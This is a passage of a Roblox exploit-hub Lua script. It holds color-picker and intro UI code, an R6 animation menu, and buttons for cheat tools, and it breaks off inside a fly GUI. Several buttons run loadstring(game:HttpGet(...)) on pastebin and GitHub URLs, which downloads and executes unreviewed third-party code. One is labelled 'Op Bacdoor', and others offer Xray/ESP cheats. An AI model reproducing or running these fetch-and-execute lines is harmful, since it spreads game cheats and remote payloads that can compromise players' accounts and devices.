        end)

        frame.ArrowFrame.Down.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Down.BackgroundTransparency = 0.5
            elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
                local releaseEvent,runEvent
        
                local startTime = tick()
                local pressing = true
                local startNum = tonumber(frame.Text)
        
                if not startNum then return end
        
                releaseEvent = user.InputEnded:Connect(function(input)
                    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                    releaseEvent:Disconnect()
                    pressing = false
                end)
        
                startNum = startNum - 1
                func(startNum)
                while pressing do
                    if tick()-startTime > 0.3 then
                        startNum = startNum - 1
                        func(startNum)
                    end
                    wait(0.1)
                end
            end
        end)

        frame.ArrowFrame.Down.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                frame.ArrowFrame.Down.BackgroundTransparency = 1
            end
        end)
    end
    colorSpace.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
    
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
    
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    colorSpaceInput()
                end
            end)
    
            colorSpaceInput()
        end
    end)
    colorStrip.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
    
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
    
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    colorStripInput()
                end
            end)
    
            colorStripInput()
        end
    end)
    local function updateHue(str)
        local num = tonumber(str)
        if num then
            hue = math.clamp(math.floor(num),0,359)/359
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            hueInput.Text = tostring(hue*359)
            updateColor(1)
        end
    end
    hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
    local function updateSat(str)
        local num = tonumber(str)
        if num then
            sat = math.clamp(math.floor(num),0,255)/255
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            satInput.Text = tostring(sat*255)
            updateColor(1)
        end
    end
    satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
    local function updateVal(str)
        local num = tonumber(str)
        if num then
            val = math.clamp(math.floor(num),0,255)/255
            local hsvColor = Color3.fromHSV(hue,sat,val)
            red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
            valInput.Text = tostring(val*255)
            updateColor(1)
        end
    end
    valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
    
    local function updateRed(str)
        local num = tonumber(str)
        if num then
            red = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            redInput.Text = tostring(red*255)
            updateColor(2)
        end
    end
    redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
    
    local function updateGreen(str)
        local num = tonumber(str)
        if num then
            green = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            greenInput.Text = tostring(green*255)
            updateColor(2)
        end
    end
    greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
    
    local function updateBlue(str)
        local num = tonumber(str)
        if num then
            blue = math.clamp(math.floor(num),0,255)/255
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            blueInput.Text = tostring(blue*255)
            updateColor(2)
        end
    end
    blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
    
    local colorChoice = Instance.new("TextButton")
    colorChoice.Name = "Choice"
    colorChoice.Size = UDim2.new(0,25,0,18)
    colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
    colorChoice.Text = ""
    colorChoice.AutoButtonColor = false
    
    local row = 0
    local column = 0
    for i,v in pairs(basicColors) do
        local newColor = colorChoice:Clone()
        newColor.BackgroundColor3 = v
        newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
        
        newColor.MouseButton1Click:Connect(function()
            red,green,blue = v.r,v.g,v.b
            local newColor = Color3.new(red,green,blue)
            hue,sat,val = Color3.toHSV(newColor)
            updateColor()
        end)	
        
        newColor.Parent = basicColorsFrame
        column = column + 1
        if column == 6 then row = row + 1 column = 0 end
    end
    
    row = 0
    column = 0
    for i = 1,12 do
        local color = customColors[i] or Color3.new(0,0,0)
        local newColor = colorChoice:Clone()
        newColor.BackgroundColor3 = color
        newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
        
        newColor.MouseButton1Click:Connect(function()
            local curColor = customColors[i] or Color3.new(0,0,0)
            red,green,blue = curColor.r,curColor.g,curColor.b
            hue,sat,val = Color3.toHSV(curColor)
            updateColor()
        end)
        
        newColor.MouseButton2Click:Connect(function()
            customColors[i] = chosenColor
            newColor.BackgroundColor3 = chosenColor
        end)
        
        newColor.Parent = customColorsFrame
        column = column + 1
        if column == 6 then row = row + 1 column = 0 end
    end
    
    pickerTopBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local releaseEvent,mouseEvent
            local dragOffX,dragOffY = mouse.X-pickerTopBar.AbsolutePosition.X,mouse.Y-pickerTopBar.AbsolutePosition.Y
            
            releaseEvent = user.InputEnded:Connect(function(input)
                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
                releaseEvent:Disconnect()
                mouseEvent:Disconnect()
            end)
            
            mouseEvent = user.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    pickerGui.Position = UDim2.new(0,mouse.X-dragOffX,0,mouse.Y-dragOffY)
                end
            end)
        end
    end)
    
    okButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor) end pickerGui.Visible = false savedColor = chosenColor colorPickerOpen = false end)
    okButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0.4 end end)
    okButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then okButton.BackgroundTransparency = 0 end end)
    
    cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end pickerGui.Visible = false updateBack(savedColor, backDrop) colorPickerOpen = false end)
    cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
    cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)
    
    closeButton.MouseButton1Click:Connect(function() pickerGui.Visible = false updateBack(savedColor, backDrop) colorPickerOpen = false end)
    
    updateColor()
    
    newMt.SetColor = function(self,color)
        red,green,blue = color.r,color.g,color.b
        hue,sat,val = Color3.toHSV(color)
        updateColor()
    end
    
    newMt.Gui = rootGui
    
    return newMt
end
--end

local ColorPickInstance = ColorPicker.new()

local rainbowColors = {
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 255, 255),
}

local rainbow = false
local customRainbow = false
local rainbowReset = false
local rainbowStart = 1
local currentRainbow = nil

spawn(function()
    while wait() do
        if rainbow == true then
            for i,v in pairs(rainbowColors) do
                local start = rainbowColors[i]
                local rEnd = i + 1
                if not rainbowColors[rEnd] then
                    rEnd = 1
                end
                if customRainbow == true then
                    local back = screenGui.Top.Main.BackgroundColor3
                    start = back
                end
                for num = rainbowCount, 1, -1 do
                    currentRainbow = start:Lerp(rainbowColors[rEnd], (rainbowCount - num)/rainbowCount)
                    if rainbow == true then
                        updateBack(currentRainbow)
                    else
                        break
                    end
                    wait()
                end
                customRainbow = false
            end
            if rainbowReset == true then
                rainbowReset = false
                rainbow = false
                currentRainbow = screenGui.Top.Main.BackgroundColor3
                for num = rainbowCount, 1, -1 do
                    currentRainbow = currentRainbow:Lerp(savedColor, (rainbowCount - num)/rainbowCount)
                    updateBack(currentRainbow)
                    if rainbow == true then
                        rainbowReset = false
                        break
                    end
                    wait()
                end
                wait()
            end
        end
    end
end)--]]

--Settings Tab
--Open Colour Picker
screenGui.Main.Top.Important.SettingsTab.colorpickopen.MouseButton1Up:Connect(function()
    colourpicker.Enabled = true
end)

--Reset GUI
screenGui.Main.Top.Important.SettingsTab.ResetGui.MouseButton1Up:Connect(function()

end)

--Save Settings
screenGui.Main.Top.Important.SettingsTab.SaveSettings.MouseButton1Up:Connect(function()

end)

--Colour Picker Background On
screenGui.Main.Top.Important.SettingsTab.PickerBackgroundOn.MouseButton1Up:Connect(function()

end)

--Colour Picker Background Off
screenGui.Main.Top.Important.SettingsTab.PickerBackgroundOff.MouseButton1Up:Connect(function()

end)

--Close
screenGui.Main.Top.Close.MouseButton1Up:connect(function()
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    screenGui.Main:TweenSize(UDim2.new(0, 0, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    wait()
    screenGui.Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.25)
    wait(0.25)
end)

--Open
screenGui.Open.MouseButton1Up:connect(function()
    screenGui.Open:TweenPosition(UDim2.new(0, -75, 0.75, 0), "Out", "Quad", 0.25)
    wait(0.25)
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 31), "Out", "Quad", 0.5)
    wait(0.5)
    wait()
    screenGui.Main:TweenSize(UDim2.new(0, 361, 0, 347), "Out", "Quad", 0.5)
    wait(0.5)
end)

--Start Intro
intro.Intro.Size = UDim2.new(0, 0, 0, 25)

intro.Intro.Top.Visible = false
intro.Intro.Loading.Visible = false
intro.Intro.Motto.Visible = false
intro.Intro.Background.Visible = false

wait(0)

intro.Enabled = true

intro.Intro:TweenSize(UDim2.new(0, 376, 0, 25), "Out", "Quad", 0.5)

wait(0.6)
intro.Intro.Top.Visible = true
intro.Intro:TweenSize(UDim2.new(0, 376, 0, 169), "Out", "Quad", 0.5)
wait(0.1)
intro.Intro.Motto.Visible = true
wait(0.1)
intro.Intro.Background.Visible = true
wait(0.2)
intro.Intro.Loading.Visible = true
wait(0.5)

intro.Intro.Background.Bar:TweenSize(UDim2.new(1, 0, 0, 33), "Out", "Quad", 3)

--End Intro
wait(1)

screenGui.Main.Size = UDim2.new(0, 0, 0, 31)
screenGui.Open.Position = UDim2.new(0, -75, 0.75, 0)

wait(3)

wait(0.5)
intro.Intro:TweenSize(UDim2.new(0, 376, 0, 25), "Out", "Quad", 0.5)
wait()
intro.Intro.Loading.Visible = false
wait(0.1)
intro.Intro.Background.Visible = false
wait(0.2)
intro.Intro.Motto.Visible = false
wait(0.5)
intro.Intro:TweenSize(UDim2.new(0, 0, 0, 25), "Out", "Quad", 0.4)
intro.Intro.Top.Visible = false
wait(1)
intro:Destroy()

wait(0.5)

screenGui.Enabled = true

screenGui.Open:TweenPosition(UDim2.new(0, 0, 0.75, 0), "Out", "Quad", 0.5)
wait(0.5)

print("Rose Hub process finished at " .. round(tick()-start) .. " milliseconds.")
end)


Section:NewButton("R6 Gui animation", "Animation cool", function()
save = nil
c3 = function(r,g,b) return Color3.new(r/255,g/255,b/255) end

--do something ro get save file

if not save then
	save = {
		ui = {
			highlightcolor = c3(33, 122, 255);
			errorcolor = c3(255, 0, 0);
			--AnimationPriority colors
			core = c3(65, 65, 65);
			idle = c3(134, 200, 230);
			movement = c3(114, 230, 121);
			action = c3(235, 235, 235);
		};
		preferences = {
			
		};
		custom_animations = {
			template = {
				Title = "";
				AnimationId = "rbxassetid://";
				Image = "rbxassetid://2151539455"; --not required
				Speed = 1;
				Time = 0;
				Weight = 1;
				Loop = false;
				R6 = true;
				Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
			};
		};
	}
end

lp = game:GetService("Players").LocalPlayer
m = lp:GetMouse()

function getHumanoid()
	if not lp.Character then return nil end
	return lp.Character:FindFirstChildWhichIsA("Humanoid")
end
screengui = game:GetObjects("rbxassetid://02159099015")[1]
screengui.Parent = game:GetService("CoreGui")
main = screengui.Topbar.Main

mainframe = main.MainFrame
scrollframe = mainframe.ScrollingFrame
items = scrollframe.Items
search = scrollframe.SearchFrame.Search
searchbutton = scrollframe.SearchFrame.ImageLabel.TextButton
searchframe = scrollframe.SearchFrame

preview = main.Preview
previewimage = preview.Image
previewtitle = preview.Title
previewdesc = preview.Desc

function draggable(gObj)
	local UserInputService = game:GetService("UserInputService")

	local gui = gObj
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
function tween(object,style,direction,t,goal)
    local tweenservice = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(t,Enum.EasingStyle[style],Enum.EasingDirection[direction])
    local tween = tweenservice:Create(object,tweenInfo,goal)
    tween:Play()
    return tween
end

draggable(screengui.Topbar)

function checkIfStudio()
	return game.Name ~= "Game"
end

if not checkIfStudio() then
	print'Client is not in Roblox studio'
	--main.Size = UDim2.new(0.398, 0, 0.477, 0)
end

search.Changed:connect(function(p)
	local n = 0
	for i,v in pairs (items:GetChildren()) do
		if v:IsA("TextButton") and not string.find(v.Title.Text:lower(), search.Text:lower()) then
			v.Visible = false
		elseif v:IsA("TextButton") and string.find(v.Title.Text:lower(), search.Text:lower()) then
			v.Visible = true
			n = n + 1
		end
	end
	if p == "Text" then
		if n > 0 then
			tween(searchframe, "Sine", "Out", 0.25, {
				BorderColor3 = save.ui.highlightcolor;
			})
			wait(0.25)
			tween(searchframe, "Sine", "In", 0.5, {
				BorderColor3 = c3(58, 58, 58);
			})
		else
			tween(searchframe, "Sine", "Out", 0.25, {
				BorderColor3 = save.ui.errorcolor;
			})
			wait(0.25)
			tween(searchframe, "Sine", "In", 0.5, {
				BorderColor3 = c3(58, 58, 58);
			})
		end
	end
end)

spawn(function()
	while wait(10) do
		--auto-save every 10 seconds
	end
end)
cam = workspace.CurrentCamera

running = {}
popAnims = {
	armturbine = {
		Title = "Arm Turbine";
		AnimationId = "rbxassetid://259438880";
		Speed = 1.5;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	weirdsway = {
		Title = "Weird Sway";
		AnimationId = "rbxassetid://248336677";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	weirdfloat = {
		Title = "Weird Float";
		AnimationId = "rbxassetid://248336459";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	weirdpose = {
		Title = "Weird Pose";
		AnimationId = "rbxassetid://248336163";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	penguinslide = {
		Title = "Penguin Slide";
		AnimationId = "rbxassetid://282574440";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	scream = {
		Title = "Scream";
		AnimationId = "rbxassetid://180611870";
		Speed = 1.5;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	crouch = {
		Title = "Crouch";
		AnimationId = "rbxassetid://182724289";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
happydance = {
		Title = "Happy Dance";
		AnimationId = "rbxassetid://248335946";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	floatinghead = {
		Title = "Floating Head";
		AnimationId = "rbxassetid://121572214";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	balloonfloat = {
		Title = "Balloon Float";
		AnimationId = "rbxassetid://148840371";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	pinchnose = {
		Title = "Pinch Nose";
		AnimationId = "rbxassetid://30235165";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	goal = {
		Title = "Goal!";
		AnimationId = "rbxassetid://28488254";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	cry = {
		Title = "Cry";
		AnimationId = "rbxassetid://180612465";
		Speed = 0;
		Time = 1.5;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	partytime = {
		Title = "Party Time";
		AnimationId = "rbxassetid://33796059";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	moondance = {
Title = "Moon Dance";
		AnimationId = "rbxassetid://27789359";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	insanelegs = {
		Title = "Insane Legs";
		AnimationId = "rbxassetid://87986341";
		Speed = 99;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	rotation = {
		Title = "Rotation";
		AnimationId = "rbxassetid://136801964";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	insanerotation = {
		Title = "Insane Rotation";
		AnimationId = "rbxassetid://136801964";
		Speed = 99;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	roar = {
		Title = "Roar";
		AnimationId = "rbxassetid://163209885";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	spin = {
		Title = "Spin";
		AnimationId = "rbxassetid://188632011";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	zombiearms = {
		Title = "Zombie Arms";
		AnimationId = "rbxassetid://183294396";
		Speed = 0;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	insane = {
		Title = "Insane";
		AnimationId = "rbxassetid://33796059";
		Speed = 99;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	neckbreak = {
Title = "Neck Break";
		AnimationId = "rbxassetid://35154961";
		Speed = 0;
		Time = 2;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	headdetach = {
		Title = "Head Detach";
		AnimationId = "rbxassetid://35154961";
		Speed = 0;
		Time = 3;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	idle = {
		Title = "Idle";
		AnimationId = "rbxassetid://180435571";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
	charleston = {
		Title = "Charleston";
		AnimationId = "rbxassetid://429703734";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
}
robloxOwns = {}

ownerOwns = {}

customAnims = {}

function getOwnedAnimations(userid)
	local httpserv = game:GetService("HttpService")
	local owned = httpserv:GetAsync("https://inventory.roblox.com/v1/users/"..userid.."/inventory/Animation?pageNumber=1&itemsPerPage=10", true)
	return owned
end


function getAnim(name)
	return popAnims[name] or customAnims[name]
end
function runAnim(info, humanoid)
	local animation = Instance.new("Animation")
	animation.AnimationId = info.AnimationId
	
	local animtrack = humanoid:LoadAnimation(animation)
	table.insert(running,animtrack)
	animtrack.Priority = info.Priority
	animtrack.Looped = info.Loop
	
	animtrack:Play()
	animtrack:AdjustSpeed(info.Speed)
	animtrack:AdjustWeight(info.Weight)
	animtrack.TimePosition = info.Time
	
	animtrack.Stopped:connect(function()
		for i = 1,#running do
			if running[i] == animtrack then
				table.remove(running,i)
			end
		end
	end)
	
	return animtrack
end
template = items.Template
template.Parent = nil

function clear()
	for i,v in pairs (items:GetChildren()) do
		if v:IsA("TextButton") then
			v:Destroy()
		end
	end
end

--[[
	idle = {
		Title = "Idle";
		AnimationId = "rbxassetid://180435571";
		Speed = 1;
		Time = 0;
		Weight = 1;
		Loop = true;
		R6 = true;
		Priority = 2; --0, 1, 2, and 1000 are acceptable priorities
	};
--]]

function createbutton(v)
	local temp = template:Clone()
	temp.Parent = items
	temp.Name = v.Title
	temp.Title.Text = v.Title
	temp.Image.Image = v.Image or "rbxassetid://2151539455"
	if temp.Image.Image == "rbxassetid://2151539455" then
		temp.Image.ImageColor3 = (v.Priority == 0 and save.ui.idle) or (v.Priority == 1 and save.ui.movement) or (v.Priority == 2 and save.ui.action) or (v.Priority == 1000 and save.ui.core)
	else
		temp.Image.ImageColor3 = Color3.new(1,1,1)
	end
	temp.LayoutOrder = math.random(1,10000)
	
	temp.Settings.AnimationId.Value = v.AnimationId
	temp.Settings.Loop.Value = v.Loop
	temp.Settings.Priority.Value = v.Priority
	temp.Settings.R6.Value = v.R6
	temp.Settings.Speed.Value = v.Speed
	temp.Settings.Weight.Value = v.Weight
	temp.Settings.Time.Value = v.Time
	
	temp.MouseEnter:connect(function()
		preview.Title.Text = v.Title
		preview.Desc.Text = "Speed: "..tostring(v.Speed).."\nPriority: "..tostring(v.Priority).."\nR6 Rig: "..tostring(v.R6).."\nAnimID: "..tostring(v.AnimationId).."\n\n"..(v.Description or "No description provided")
		
		preview.Image.Image = v.Image or "rbxassetid://2151539455"
		if preview.Image.Image == "rbxassetid://2151539455" then
			preview.Image.ImageColor3 = (v.Priority == 0 and save.ui.idle) or (v.Priority == 1 and save.ui.movement) or (v.Priority == 2 and save.ui.action) or (v.Priority == 1000 and save.ui.core)
		else
			preview.Image.ImageColor3 = Color3.new(1,1,1)
		end
	end)
	temp.MouseButton1Click:connect(function()
		temp.Border.ImageColor3 = save.ui.highlightcolor
		for i,anim in pairs (running) do
			if anim.Animation.AnimationId == v.AnimationId then
				anim:Stop()
				return
			end
		end
temp.Border.Visible = true
		local rAnim = runAnim(v, getHumanoid())
		rAnim.Stopped:connect(function()
			temp.Border.Visible = false
		end)
	end)
	
	return temp
end

dropdown = mainframe.ScrollingFrame.DropdownFrame
elements = dropdown.HoldContentsFrame.Frame.Elements
dropdownenabled = true

tween(dropdown.HoldContentsFrame.Frame, "Linear", "In", 0, {
	Position = UDim2.new(0,0,-1,0)
})
dropdown.HoldContentsFrame.Frame.Visible = false

dropdowndeactivate = screengui.DropdownDeactivate
dropdowndeactivate.Visible = false

function hideddown()
	tween(dropdown.HoldContentsFrame.Frame, "Linear", "In", 0, {
		Position = UDim2.new(0,0,-1,0)
	})
	dropdown.HoldContentsFrame.Frame.Visible = false
	dropdowndeactivate.Visible = false
	dropdownenabled = true
	
	for i,e in pairs (elements:GetChildren()) do
		if e:IsA("TextButton") then
			e.BackgroundColor3 = c3(46,46,46)
		end
	end
end

dropdown.MouseButton1Click:connect(function()
	print'ddownclick'
	dropdownenabled = not dropdownenabled
	if dropdownenabled then
		hideddown()
	else
		tween(dropdown.HoldContentsFrame.Frame, "Linear", "In", 0.3, {
			Position = UDim2.new(0,0,0,0)
		})
		dropdown.HoldContentsFrame.Frame.Visible = true
		dropdowndeactivate.Visible = true
	end
end)

dropdowndeactivate.MouseButton1Down:connect(function()
	hideddown()
end)

for i,v in pairs (elements:GetChildren()) do
	if v:IsA("TextButton") then
		v.MouseEnter:connect(function()
			for i,e in pairs (elements:GetChildren()) do
				if e:IsA("TextButton") then
					e.BackgroundColor3 = c3(46,46,46)
				end
			end
			v.BackgroundColor3 = save.ui.highlightcolor
		end)
		v.MouseButton1Click:connect(function()
			hideddown()
			dropdown.TextLabel.Text = v.Name
			sort(v.Name)
		end)
	end
end

function sort(category)
	clear()
	if category == "Popular" then
		for i,v in pairs (popAnims) do
			local temp = createbutton(v)
		end
	elseif category == "By Roblox" then
		
	end
end

game:GetService('RunService').RenderStepped:connect(function()
	items.Parent.CanvasSize = UDim2.new(0,0,0,items.GridLayout.AbsoluteContentSize.Y + 50)
end)

sort("Popular")
end)


Section:NewButton("Screen GUI", "Xray,esp, and more", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/Ekn7geJz'))()
end)

Section:NewButton("Syntax hub Key: SyntaxV3Free", "Gives you Syntax Hub", function()
shared.colors = {

    Icons = Color3.fromRGB(0,255,149),

    Version = Color3.fromRGB(0,255,149),

    Text = Color3.fromRGB(255,255,255),

    Description = Color3.fromRGB(125,125,125),

    TabList = Color3.fromRGB(30,30,30),

    Scripts = Color3.fromRGB(30,30,30),

    Back = Color3.fromRGB(25,25,25),

    Glow = Color3.fromRGB(0,0,0),

}

shared.transparency = {

    Version = 0,

    Text = 0,

    Description = 0,

    Icons = 0,

    Back = 0,

    Glow = 0.5,

    TabList = 0,

    Scripts = 1,

}



loadstring(game:HttpGet("https://raw.githubusercontent.com/Memeboiyot/Syntax-V3-Free/main/Syntax%20v3    ", true))()
end)

Section:NewButton("Terminate HUB", "Animtion GUI", function()
    _G.Velocity = Vector3.new(30,0,0) loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatek/ProjectTerm/main/main.lua"))()
end)

Section:NewButton("MoonUI V10", "Op Bacdoor", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()
end)

Section:NewButton("ArtemisGUI", "GUI", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/iBWWxP51"))()
end)

Section:NewButton("Fly Gui V3", "fly lol", function()
local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local up = Instance.new("TextButton")
local down = Instance.new("TextButton")
local onof = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local plus = Instance.new("TextButton")
local speed = Instance.new("TextLabel")
local mine = Instance.new("TextButton")
local closebutton = Instance.new("TextButton")
local mini = Instance.new("TextButton")
local mini2 = Instance.new("TextButton")

main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
main.ResetOnSpawn = false

Frame.Parent = main
Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "up"
up.Parent = Frame
up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
up.Size = UDim2.new(0, 44, 0, 28)
up.Font = Enum.Font.SourceSans
up.Text = "UP"
up.TextColor3 = Color3.fromRGB(0, 0, 0)
up.TextSize = 14.000

down.Name = "down"
down.Parent = Frame
down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
down.Position = UDim2.new(0, 0, 0.491228074, 0)
down.Size = UDim2.new(0, 44, 0, 28)
down.Font = Enum.Font.SourceSans
down.Text = "DOWN"
down.TextColor3 = Color3.fromRGB(0, 0, 0)
down.TextSize = 14.000

onof.Name = "onof"
onof.Parent = Frame
onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
onof.Size = UDim2.new(0, 56, 0, 28)
onof.Font = Enum.Font.SourceSans
onof.Text = "fly"
onof.TextColor3 = Color3.fromRGB(0, 0, 0)
onof.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
